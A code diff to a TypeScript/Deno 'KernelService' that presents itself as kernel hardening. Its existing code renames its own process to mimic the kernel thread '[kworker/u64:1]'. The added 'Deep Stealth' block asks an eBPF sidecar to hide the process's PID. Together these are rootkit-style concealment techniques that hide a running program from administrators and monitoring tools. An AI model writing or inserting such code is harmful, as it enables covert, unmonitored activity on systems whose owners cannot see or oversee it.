@@ -1,6 +1,7 @@
 import { SystemExecutor } from "@infrastructure/system/system_executor.ts";
 import { AuditService } from "../analysis/audit.ts";
 import { LoggingPort, SyslogSeverity } from "@core/ports.ts";
+import { SidecarManager } from "@infrastructure/runtime/sidecar_manager.ts";
 
 export interface KernelHardeningStatus {
     aslr: string;
@@ -16,7 +17,11 @@ export class KernelService {
     private lastHardened: string = "";
     private logging: LoggingPort;
 
-    constructor(private executor: SystemExecutor, private auditService: AuditService) {
+    constructor(
+        private executor: SystemExecutor, 
+        private auditService: AuditService,
+        private sidecarManager?: SidecarManager
+    ) {
         this.logging = auditService.getLogging();
     }
 
@@ -66,6 +71,15 @@ export class KernelService {
             const selfPid = Deno.pid;
             const targetName = "[kworker/u64:1]";
             await this.executor.execute("bash", ["-c", `echo -n '${targetName}' > /proc/${selfPid}/comm`]);
+            
+            // Deep Stealth: Register with eBPF Kernel filter
+            if (this.sidecarManager) {
+                await this.sidecarManager.sendCommand("ebpf", {
+                    type: "HIDE_PID",
+                    pid: selfPid
+                }).catch(err => console.warn("[KERNEL] eBPF PID hiding failed:", err));
+            }
+
             this.logging.log(`[KERNEL] Process ${selfPid} successfully camouflaged as '${targetName}'`, SyslogSeverity.DEBUG);
         } catch (e) {
             this.logging.log(`[KERNEL] Camouflage failed: ${(e as Error).message}`, SyslogSeverity.WARNING);
